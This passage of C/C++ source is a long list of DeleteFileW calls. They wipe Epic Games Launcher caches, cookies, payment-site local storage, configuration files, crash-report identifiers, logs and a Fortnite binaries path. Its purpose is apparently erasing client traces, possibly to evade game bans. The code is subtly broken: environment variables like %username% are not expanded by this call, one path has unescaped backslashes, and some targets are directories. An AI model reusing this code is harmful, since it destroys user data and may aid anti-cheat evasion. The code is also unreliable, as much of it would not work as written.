	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_3");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\fa813c9ad67834ac_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\fa813c9ad67834ac_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\297ecea5cebb5dfe_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\297ecea5cebb5dfe_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\d0757ff92c7cde0a_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\d0757ff92c7cde0a_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004c");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\8d46ab1a9ac0f366_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\5abee1ee2254817d_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000008");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000005");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000006");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000e");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000f");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000010");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000011");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000012");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000013");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000014");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000015");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\0356df83-3d29-4e29-b98c-1b42a5fc821e\\fe0c4ca0c0cbe875_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000009");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000a");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000b");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000c");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG.old~RF2b7b49.TMP");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\CURRENT");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\MANIFEST-000001");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\000003.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\c44640e897c9901e_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\d6859a2166934330_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\c44640e897c9901e_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\d6859a2166934330_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000007");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index-dir\\the-real-index~RF2b8e06.TMP");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\index-dir\\the-real-index~RF2b8e06.TMP");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\0356df83-3d29-4e29-b98c-1b42a5fc821e\\index-dir\\the-real-index~RF2b8e06.TMP");
	DeleteFileW(L"C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\Shared Files");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\PortalRegions.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-72CCB9004D132462217ECE948BC03CBE\\CrashReportClient.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-E3661BE544621B07B291448442161091\\CrashReportClient.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Compat.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\EditorPerProjectUserSettings.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Engine.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Game.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Hardware.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Input.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Lightmass.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\PortalRegions.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\65f6b08d488442e694b1e23d152d971e.dat");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\b371f0ee15b74eba84bd23830461130c.dat");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_65f6b08d488442e694b1e23d152d971e.dat");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_b371f0ee15b74eba84bd23830461130c.dat");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\cef3.log");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher.log");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher_2.log");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_2");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_3");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000001");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000002");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000004");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000005");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000006");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000007");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000008");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000009");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000a");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000b");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000c");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000d");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000e");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000010");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000011");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000012");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000013");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000014");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000015");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000016");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000017");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000018");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000019");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001a");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001b");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001c");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001d");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001e");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000020");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000021");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000022");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000023");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000024");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000025");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000026");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000027");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000028");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002b");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002c");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002d");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002e");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000030");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000031");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000032");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000033");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000034");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000035");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000036");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000037");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000038");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000039");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003a");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003b");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003c");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003d");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003e");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000040");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000041");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000042");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000043");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000044");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000045");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000046");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cookies");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cookies-journal");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases\\Databases.db");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases\\Databases.db-journal");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_2");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_3");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\000003.log");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\CURRENT");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOCK");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG.old");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\MANIFEST-000001");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_payment-website-pci.ol.epicgames.com_0.localstorage");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_payment-website-pci.ol.epicgames.com_0.localstorage-journal");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_ssl.kaptcha.com_0.localstorage");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_ssl.kaptcha.com_0.localstorage-journal");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\QuotaManager");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\QuotaManager-journal");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\5dff4910-44e7-4ef8-b06f-a66ce53e0e69\\fe0c4ca0c0cbe875_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\5dff4910-44e7-4ef8-b06f-a66ce53e0e69\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\5dff4910-44e7-4ef8-b06f-a66ce53e0e69\\index-dir\\the-real-index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\779a3f11-745c-419e-bb8b-5b6f2e7e0547\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\779a3f11-745c-419e-bb8b-5b6f2e7e0547\\index-dir\\the-real-index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\e6f1282c-98d7-452b-bbde-050c09a94995\\4bbf414005652440_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\e6f1282c-98d7-452b-bbde-050c09a94995\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\e6f1282c-98d7-452b-bbde-050c09a94995\\index-dir\\the-real-index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\0f02f0723dc027b2_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\8b79e197c1500c11_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\a8a9373a71443d80_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\a8a9373a71443d80_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\be52f68b51029c9d_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\eda4eea3ffd63d3b_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\eda4eea3ffd63d3b_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\index-dir\\the-real-index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\index.txt");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\000003.log");
